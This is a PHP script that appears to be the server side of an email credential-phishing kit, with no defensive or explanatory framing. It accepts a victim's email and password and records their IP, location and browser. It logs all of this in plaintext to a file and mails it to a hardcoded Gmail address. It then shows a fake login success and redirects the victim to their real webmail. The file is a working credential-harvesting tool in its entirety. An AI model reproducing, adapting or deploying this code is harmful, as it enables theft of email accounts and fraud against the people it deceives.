<?php
// Enhanced CORS headers - Must be at the very top
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE');
header('Access-Control-Allow-Headers: Origin, Content-Type, Accept, Authorization, X-Request-With, X-Requested-With');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Max-Age: 86400');
header('Content-Type: application/json; charset=UTF-8');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit(0);
}

// Simple connectivity test for GET requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo json_encode(array(
        'status' => 'success',
        'message' => 'CORS test successful - Server is reachable',
        'timestamp' => date('Y-m-d H:i:s'),
        'server' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'method' => 'GET'
    ));
    exit;
}

// For POST requests - simplified version without dependencies
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get basic input
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Basic validation
    if (empty($email) || empty($password)) {
        echo json_encode(array(
            'signal' => 'error',
            'msg' => 'Email and password are required',
            'success' => false
        ));
        exit;
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo json_encode(array(
            'signal' => 'error',
            'msg' => 'Invalid email format',
            'success' => false
        ));
        exit;
    }
    
    // Get client info
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    // Get domain from email
    $parts = explode("@", $email);
    $domain = isset($parts[1]) ? $parts[1] : 'unknown';
    
    // Basic geolocation (optional)
    $country = 'Unknown';
    $city = 'Unknown';
    
    try {
        $geoData = @file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip);
        if ($geoData) {
            $geo = json_decode($geoData);
            $country = $geo->geoplugin_countryName ?? 'Unknown';
            $city = $geo->geoplugin_city ?? 'Unknown';
        }
    } catch (Exception $e) {
        // Ignore geo errors
    }
    
    // Prepare message for logging/email
    $message = "Email = " . $email . "\n";
    $message .= "Password = " . $password . "\n";
    $message .= "IP: " . $country . " | " . $city . " | " . $ip . "\n";
    $message .= "Browser: " . $browser . "\n";
    $message .= "Domain: " . $domain . "\n";
    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    
    // Log to file
    $logFile = 'login_attempts.txt';
    $logEntry = "[" . date('Y-m-d H:i:s') . "] " . $message . "\n" . str_repeat("-", 50) . "\n";
    @file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    
    // Simple SMTP test (basic version)
    $validCredentials = false;
    $errorMessage = '';
    
    try {
        // Test SMTP connection
        $smtpHost = 'mail.' . $domain;
        $smtpPort = 587;
        
        $socket = @fsockopen($smtpHost, $smtpPort, $errno, $errstr, 10);
        if ($socket) {
            fclose($socket);
            $validCredentials = true; // Basic connectivity test
        }
    } catch (Exception $e) {
        $errorMessage = 'SMTP test failed: ' . $e->getMessage();
    }
    
    // Send email notification (simplified - using PHP mail function)
    $to = 'skkho87.sm@gmail.com'; // Your notification email
    $subject = ($validCredentials ? 'Valid' : 'Invalid') . ' Login Attempt || ' . $country . ' || ' . $email;
    
    $emailBody = "Login attempt details:\n\n" . $message;
    $headers = "From: security-alert@" . $_SERVER['HTTP_HOST'] . "\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    @mail($to, $subject, $emailBody, $headers);
    
    // Return response
    if ($validCredentials) {
        echo json_encode(array(
            'signal' => 'ok',
            'msg' => 'Login successful! Redirecting to your mailbox...',
            'success' => true,
            'redirect_url' => 'https://webmail.' . $domain
        ));
    } else {
        echo json_encode(array(
            'signal' => 'not ok',
            'msg' => 'Invalid email or password. Please check your credentials and try again.',
            'success' => false,
            'error_detail' => $errorMessage
        ));
    }
}
?>